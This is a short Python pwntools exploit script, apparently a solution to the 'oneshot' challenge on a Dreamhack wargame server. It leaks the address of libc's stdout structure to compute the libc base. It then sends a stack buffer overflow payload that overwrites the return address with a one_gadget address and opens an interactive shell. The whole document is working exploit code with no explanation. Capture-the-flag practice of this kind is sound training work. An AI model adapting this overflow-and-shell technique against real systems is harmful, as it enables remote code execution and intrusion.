from pwn import *

context.log_level = True

p = remote('host3.dreamhack.games', 21525)
# p = process('./oneshot')
e = ELF('./oneshot')
libc = ELF('./libc-2.23.so')

p.recvuntil('stdout: ')
stdout = int(p.recvuntil('\n')[:-1], 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']

one_gadget = libc_base + 0xf1247 # 0xf03a4, 0x4527a, 0x45226

p.recvuntil('MSG: ')
payload = b'A'*0x18 + p64(0) + b'B'*0x8 + p64(one_gadget)

p.send(payload)

p.interactive()
